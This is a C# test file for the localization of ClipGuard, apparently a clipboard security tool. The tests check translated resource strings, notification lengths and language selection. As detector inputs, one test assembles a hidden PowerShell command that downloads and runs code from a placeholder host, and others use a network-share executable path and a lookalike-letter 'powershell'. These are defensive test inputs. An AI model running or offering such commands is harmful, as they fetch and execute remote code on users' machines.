using System.Globalization;
using System.Text.RegularExpressions;
using System.Xml.Linq;

namespace ClipGuard.Core.Tests;

/// <summary>
/// 介面多語系（#27）：每個 .resx 的翻譯檔 key 一致、沒有空字串、格式參數一致，產生的存取類別是最新的；
/// 英文環境下通知與說明是英文；長度在系統匣通知的上限內。
/// </summary>
public class LocalizationTests
{
    private const int MaxTitle = 63;    // NOTIFYICONDATA.szInfoTitle
    private const int MaxBody = 255;    // NOTIFYICONDATA.szInfo

    private static readonly string[] Languages = ["en", "zh-TW"];

    private static string RepoRoot()
    {
        for (var dir = new DirectoryInfo(AppContext.BaseDirectory); dir is not null; dir = dir.Parent)
            if (File.Exists(Path.Combine(dir.FullName, "ClipGuard.sln"))) return dir.FullName;
        throw new InvalidOperationException("找不到 ClipGuard.sln");
    }

    // 中性語系（英文）的 .resx：src/*/Resources/X.resx（檔名沒有語系）。
    private static List<string> NeutralResxFiles() =>
        Directory.EnumerateFiles(Path.Combine(RepoRoot(), "src"), "*.resx", SearchOption.AllDirectories)
            .Where(f => !f.Contains($"{Path.DirectorySeparatorChar}obj{Path.DirectorySeparatorChar}"))
            .Where(f => !Path.GetFileNameWithoutExtension(f).Contains('.'))
            .Select(f => Path.GetRelativePath(RepoRoot(), f))
            .ToList();

    public static TheoryData<string> NeutralResx() => new(NeutralResxFiles());

    private static Dictionary<string, string> Read(string path) =>
        XDocument.Load(path).Root!.Elements("data")
            .ToDictionary(d => (string)d.Attribute("name")!, d => (string?)d.Element("value") ?? "");

    private static string Translation(string neutral, string culture) =>
        Path.Combine(Path.GetDirectoryName(neutral)!, $"{Path.GetFileNameWithoutExtension(neutral)}.{culture}.resx");

    private static Dictionary<string, string> AppStrings(string lang)
    {
        var neutral = Path.Combine(RepoRoot(), "src", "ClipGuard.App", "Resources", "Strings.resx");
        return Read(lang == "en" ? neutral : Translation(neutral, lang));
    }

    private static SortedSet<int> Placeholders(string value) =>
        new(Regex.Matches(value.Replace("{{", "").Replace("}}", ""), @"\{(\d+)(?:[,:][^}]*)?\}")
            .Select(m => int.Parse(m.Groups[1].Value, CultureInfo.InvariantCulture)));

    [Fact]
    public void 找得到兩個專案的resx()
    {
        var files = NeutralResxFiles();
        Assert.Contains(files, f => f.EndsWith("Strings.resx", StringComparison.Ordinal) && f.Contains("ClipGuard.App"));
        Assert.Contains(files, f => f.EndsWith("CoreStrings.resx", StringComparison.Ordinal));
    }

    [Theory]
    [MemberData(nameof(NeutralResx))]
    public void 翻譯檔的key跟英文一致而且都有值(string relative)
    {
        var neutralPath = Path.Combine(RepoRoot(), relative);
        var en = Read(neutralPath);
        var zh = Read(Translation(neutralPath, "zh-TW"));

        Assert.Equal(en.Keys.Order(StringComparer.Ordinal), zh.Keys.Order(StringComparer.Ordinal));
        foreach (var (key, value) in en.Concat(zh))
        {
            Assert.False(string.IsNullOrWhiteSpace(value), $"{key} 是空的");
            // 換行在 code 裡組（"\n"）：resx 裡的換行在 Windows 上可能被 git 轉成 \r\n，通知字數就不對了。
            Assert.False(value.Contains('\n') || value.Contains('\r'), $"{key} 含換行");
        }
    }

    [Theory]
    [MemberData(nameof(NeutralResx))]
    public void 翻譯檔的格式參數跟英文一致(string relative)
    {
        var neutralPath = Path.Combine(RepoRoot(), relative);
        var en = Read(neutralPath);
        var zh = Read(Translation(neutralPath, "zh-TW"));
        foreach (var (key, value) in en)
            Assert.True(Placeholders(value).SetEquals(Placeholders(zh[key])),
                $"{key}: en {{{string.Join(",", Placeholders(value))}}} vs zh-TW {{{string.Join(",", Placeholders(zh[key]))}}}");
    }

    [Theory]
    [MemberData(nameof(NeutralResx))]
    public void 存取類別是最新的(string relative)
    {
        // 產生的 X.g.cs 對每個 key 都有一個 nameof(key) 成員，沒有多出來的（改了 resx 要跑 tools/gen-resx-accessors.mjs）。
        var neutralPath = Path.Combine(RepoRoot(), relative);
        var keys = Read(neutralPath).Keys.Where(k => Regex.IsMatch(k, "^[A-Za-z_][A-Za-z0-9_]*$")).Order(StringComparer.Ordinal);
        var code = File.ReadAllText(Path.ChangeExtension(neutralPath, ".g.cs"));
        var members = Regex.Matches(code, @"nameof\((\w+)\)").Select(m => m.Groups[1].Value).Distinct().Order(StringComparer.Ordinal);
        Assert.Equal(keys, members);
    }

    [Fact]
    public void 每個Core字串在兩種語系都取得到()
    {
        var keys = Read(Path.Combine(RepoRoot(), "src", "ClipGuard.Core", "Resources", "CoreStrings.resx")).Keys;
        foreach (var lang in Languages)
        {
            using var _ = TestCulture.Use(lang);
            foreach (var key in keys)
                Assert.False(string.IsNullOrEmpty(CoreStrings.Lookup(key)), $"{lang}: {key}");
        }
    }

    [Fact]
    public void 衛星組件真的載入zh_TW()
    {
        // 名稱對不上（resx 的 manifest 名稱 vs ResourceManager 的 baseName）時會默默退回英文，這裡抓出來。
        using (TestCulture.Use("zh-TW")) Assert.Equal("會執行系統指令", CoreStrings.Explain_Generic);
        using (TestCulture.Use("en-US")) Assert.Equal("Runs system commands", CoreStrings.Explain_Generic);
    }

    // ---------- 通知長度 ----------

    [Theory]
    [InlineData("en")]
    [InlineData("zh-TW")]
    public void App的通知標題不超過上限(string lang)
    {
        var strings = AppStrings(lang);
        foreach (var (key, value) in strings.Where(kv => kv.Key.StartsWith("Notify_", StringComparison.Ordinal) && kv.Key.EndsWith("_Title", StringComparison.Ordinal)
                                                        || kv.Key.StartsWith("Paste_", StringComparison.Ordinal) && kv.Key.EndsWith("_Title", StringComparison.Ordinal)))
            Assert.True(value.Length <= MaxTitle, $"{lang} {key}: {value.Length} 字");
    }

    [Theory]
    [InlineData("en")]
    [InlineData("zh-TW")]
    public void 攔截通知留給白話說明的空間夠(string lang)
    {
        // TrayApp.ComposeBody：開頭 + "\n" + 白話說明 + "\n" + 結尾，合計 255 字；白話說明至少要留 60 字。
        var s = AppStrings(lang);
        var room = MaxBody - s["Notify_Quarantine_Head"].Length - 1 - s["Notify_Quarantine_Tail"].Length - 1;
        Assert.True(room >= 60, $"{lang}: 只剩 {room} 字");
        Assert.True(MaxBody - s["Notify_Suspicious_Head"].Length - 1 >= 60);
    }

    [Theory]
    [InlineData("en")]
    [InlineData("zh-TW")]
    public void 錢包掉包通知不會被截斷(string lang)
    {
        var s = AppStrings(lang);
        var c = CultureInfo.InvariantCulture;
        foreach (var detail in new[] { s["Notify_WalletSwap_Detail"], s["Notify_WalletSwap_DetailOtherCurrency"] })
        {
            var body = string.Format(c, detail, "USDT-TRC20", "2999", "USDT-ERC20") + "\n" + s["Notify_WalletSwap_Advice"];
            Assert.True(body.Length <= MaxBody, $"{lang}: {body.Length} 字");
        }
    }

    [Theory]
    [InlineData("en")]
    [InlineData("zh-TW")]
    public void 執行入口警告不超過通知上限(string lang)
    {
        using var _ = TestCulture.Use(lang);
        var windows = new[]
        {
            ("#32770", "Run", "explorer"), ("CabinetWClass", "x", "explorer"),
            ("#32770", "Open", "chrome"), ("ConsoleWindowClass", "x", "cmd"),
        };
        foreach (var (cls, title, process) in windows)
        foreach (var (level, quarantined) in new[] { (ThreatLevel.Suspicious, false), (ThreatLevel.Malicious, false), (ThreatLevel.None, true) })
        {
            var w = ExecutionEntryGuard.Decide(cls, title, process, level, quarantined)!;
            Assert.True(w.Title.Length <= MaxTitle, $"{lang}: {w.Title}");
            Assert.True(w.Body.Length <= MaxBody, $"{lang}: {w.Body.Length} 字");
        }
    }

    // ---------- 英文環境 ----------

    private static readonly Func<string[], string> J = parts => string.Concat(parts);

    [Fact]
    public void 英文環境的執行入口警告是英文()
    {
        using var _ = TestCulture.Use("en-US");
        var w = ExecutionEntryGuard.Decide("#32770", "Run", "explorer", ThreatLevel.None, quarantined: true)!;
        Assert.Equal("Careful! You just opened the Run dialog", w.Title);
        Assert.StartsWith("The command that was just blocked has been cleared from the clipboard.\n", w.Body);
        Assert.Contains("scam", w.Body);

        var s = ExecutionEntryGuard.Decide("CabinetWClass", "x", "explorer", ThreatLevel.Suspicious, quarantined: false)!;
        Assert.Equal("Opened File Explorer with a command in the clipboard", s.Title);
    }

    [Fact]
    public void 英文環境的白話說明是英文()
    {
        using var _ = TestCulture.Use("en-US");
        var text = J(["power", "shell -w hidden ", "i", "ex(i", "wr https://example.invalid/a)"]);
        var e = CommandExplainer.Explain(text);
        Assert.Equal("Downloads and runs code from example.invalid; Hides its window so you can't see what it does", e.Summary);
        Assert.StartsWith("What it does: Downloads and runs code from example.invalid", e.ToDisplayText(200));

        Assert.Equal("Runs system commands", CommandExplainer.Explain("cmd /c dir").Summary);
        Assert.Contains("Runs a file from a network share on example.invalid",
            CommandExplainer.Explain("\\\\example.invalid\\s\\a.exe").Actions);
    }

    [Fact]
    public void 英文環境的隱藏字元說明是英文()
    {
        using var _ = TestCulture.Use("en-US");
        var v = HiddenCharDetector.Analyze("pass​word");
        Assert.Contains("1 zero-width character(s) (invisible, but they change the content)", v.Reasons);
        var h = HiddenCharDetector.Analyze("powershеll");
        Assert.Contains(h.Reasons, r => r.StartsWith("A Cyrillic letter", StringComparison.Ordinal) && r.Contains("U+0435"));
    }

    [Fact]
    public void 英文環境的機密名稱與登記訊息是英文()
    {
        using var _ = TestCulture.Use("en-US");
        Assert.Equal("Credit card number", Assert.Single(SecretDetector.Find("card 4111 1111 1111 1111")).Label);
        Assert.Equal("Enter the secret to register.", SecretRegistration.Validate("", "")!.Message);
        Assert.Equal("(private key content masked)", PasteGuard.PemBodyMask);
    }

    [Fact]
    public void 規則檔的名稱有翻譯就用翻譯_沒有就用規則檔的()
    {
        var pem = SecretRules.All.Single(r => r.Id == "private-key-pem");
        var github = SecretRules.All.First(r => r.Id == "github-token");
        using (TestCulture.Use("en-US"))
        {
            Assert.Equal("Private key (PEM)", pem.DisplayLabel);
            Assert.Equal("GitHub token", github.DisplayLabel);
        }
        using (TestCulture.Use("zh-TW"))
        {
            Assert.Equal("私鑰（PEM）", pem.DisplayLabel);
            Assert.Equal(github.Label, github.DisplayLabel);
        }
    }

    [Fact]
    public void 每個有翻譯的規則名稱都對得到規則id()
    {
        var keys = Read(Path.Combine(RepoRoot(), "src", "ClipGuard.Core", "Resources", "CoreStrings.resx")).Keys
            .Where(k => k.StartsWith("RuleLabel_", StringComparison.Ordinal));
        var ids = SecretRules.All.Select(r => r.Id).ToHashSet();
        foreach (var k in keys) Assert.Contains(k["RuleLabel_".Length..], ids);
    }

    // ---------- 語系選擇 ----------

    [Theory]
    [InlineData("zh-TW", "zh-TW")]
    [InlineData("zh-HK", "zh-TW")]
    [InlineData("zh-MO", "zh-TW")]
    [InlineData("zh-Hant", "zh-TW")]
    [InlineData("zh-CN", "en")]
    [InlineData("zh-SG", "en")]
    [InlineData("zh-Hans", "en")]
    [InlineData("zh", "en")]
    [InlineData("en-US", "en")]
    [InlineData("ja-JP", "en")]
    [InlineData("", "en")]   // InvariantCulture
    public void 系統語系對應到有翻譯的語系(string system, string expected)
    {
        Assert.Equal(expected, UiCulture.Map(CultureInfo.GetCultureInfo(system)).Name);
    }

    [Fact]
    public void 命令列優先於環境變數_環境變數優先於系統()
    {
        var zh = CultureInfo.GetCultureInfo("zh-TW");
        var en = CultureInfo.GetCultureInfo("en-US");
        Assert.Equal("en", UiCulture.Resolve(["--lang=en"], "zh-TW", zh).Name);
        Assert.Equal("en", UiCulture.Resolve(["--lang", "en-GB"], null, zh).Name);
        Assert.Equal("zh-TW", UiCulture.Resolve([], "zh-TW", en).Name);
        Assert.Equal("zh-TW", UiCulture.Resolve([], "zh_tw", en).Name);
        Assert.Equal("zh-TW", UiCulture.Resolve([], null, zh).Name);
        Assert.Equal("en", UiCulture.Resolve([], null, en).Name);
    }

    [Fact]
    public void 不認得的語系名稱忽略()
    {
        var zh = CultureInfo.GetCultureInfo("zh-TW");
        Assert.Equal("zh-TW", UiCulture.Resolve(["--lang=zz-QQ"], "not a culture", zh).Name);
        Assert.Equal("zh-TW", UiCulture.Resolve(["--lang"], " ", zh).Name);
    }
}
